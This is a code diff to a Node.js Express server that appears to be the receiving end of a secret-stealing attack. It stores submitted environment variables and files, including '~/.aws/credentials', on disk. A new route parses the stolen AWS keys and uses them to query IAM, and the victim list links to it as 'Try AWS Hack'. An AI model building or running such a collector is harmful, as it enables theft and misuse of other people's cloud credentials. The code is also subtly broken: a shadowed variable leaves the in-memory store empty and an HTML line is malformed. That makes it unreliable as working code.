@@ -3,13 +3,65 @@ var app = express();
 var bodyParser = require('body-parser');
 var _ = require('lodash');
 var crypto = require('crypto');
+var AWS = require('aws-sdk');
+var fs = require('fs');
+var data = {};
+
 app.use(bodyParser.json());
+
+fs.mkdir('../hackery-data', function (err) {
+  if (err) {
+    throw err;
+  }
+});
 
 function md5(str) {
   return crypto.createHash('md5').update(str).digest('hex');
 }
 
-var data = {};
+function sanitiseFilename(filename) {
+  var lastIndex = filename.lastIndexOf('/');
+  if (lastIndex > -1) {
+    filename = filename.substr(lastIndex+1);
+  }
+  return filename;
+}
+
+function writeFile(dirname, filename, contents) {
+  var fs = require('fs');
+  fs.writeFile(dirname + '/' + sanitiseFilename(filename), contents, function(err) {
+    if(err) {
+      console.log(err);
+    }
+  });
+}
+
+function storeData(data) {
+  var hash = md5(JSON.stringify(data));
+  data[hash] = data;
+  var dirname = '../hackery-data/' + hash;
+  fs.mkdir(dirname, function (err) {
+    if (err) console.log(err);
+    writeFile(dirname, 'env.txt', _.map(data.envVars, function (value, key) {
+      return key + ' = ' + value;
+    }).join('\n'));
+    _.each(data.files, function (content, name) {
+      writeFile(dirname, name, content);
+    });
+  });
+}
+
+function processAwsCreds(fileContent) {
+  function getFirst(reg) {
+    var matched = fileContent.match(reg);
+    return matched && matched[1];
+  }
+  return {
+    accessKeyId: getFirst(/aws_access_key_id\s*=\s*([A-Z0-9]+)/),
+    secretAccessKey: getFirst(/aws_secret_access_key\s*=\s*([A-Za-z0-9\/]+)/)
+  }
+}
+
 
 app.get('/', function (req, res) {
   var prepped = _.map(data, function(d, k) {
@@ -24,15 +76,32 @@ app.get('/', function (req, res) {
     return '<article>'
         + '<h1>' + item.user + '</h1>'
         + '<p>' + item.envVarCount + ' environment variables</p>'
+        + '<p><a href="/aws/' + item.id + '">Try AWS Hack</a></p>'
         + '<h4>Files</h4>'
         + '<ul><li>' + item.files.join('</li><li>') + '</li></ul>'
         '</article>'
   }).join(''));
 });
 
+app.get('/aws/:id', function (req, res) {
+  var id = req.param('id');
+  var fileContents = data[id];
+  fileContents = fileContents && fileContents.files;
+  fileContents = fileContents && fileContents['~/.aws/credentials'];
+  if (fileContents) {
+    var creds = processAwsCreds(fileContents);
+    var iam = new AWS.IAM(creds);
+    iam.getUser(function (err, data) {
+      console.log(data);
+      res.send(data);
+    });
+  } else {
+    res.status(404).send('no AWS creds found');
+  }
+});
+
 app.post('/info', function (req, res) {
-  var body = req.body;
-  data[md5(JSON.stringify(body))] = body;
+  storeData(req.body);
   res.send('Thanks.');
 });
 
